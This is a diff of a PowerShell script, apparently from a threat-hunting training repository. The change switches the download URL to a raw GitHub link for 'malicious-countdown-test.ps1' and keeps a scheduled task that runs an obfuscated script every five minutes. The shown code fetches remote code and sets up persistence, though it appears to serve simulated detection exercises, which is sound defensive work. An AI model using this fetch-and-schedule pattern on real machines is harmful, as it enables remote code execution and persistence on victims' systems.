@@ -1,5 +1,5 @@
 # Step 1: Define URLs and Paths
-$downloadUrl = "https://github.com/mervintab/threat-hunting-scenarios/blob/main/assets/malicious-countdown-test.ps1"
+$downloadUrl = "https://raw.githubusercontent.com/mervintab/threat-hunting-scenarios/main/assets/malicious-countdown-test.ps1"
 $downloadsPath = "$env:USERPROFILE\Downloads"
 $tempPath = "$env:TEMP"
 $originalFile = Join-Path $downloadsPath "malicious-countdown-test.ps1"
@@ -45,5 +45,3 @@ Register-ScheduledTask -TaskName $taskName `
     -Trigger $trigger `
     -Description "Run obfuscated malicious countdown script every 5 minutes for 3 times" `
     -Force
-    -Force
-
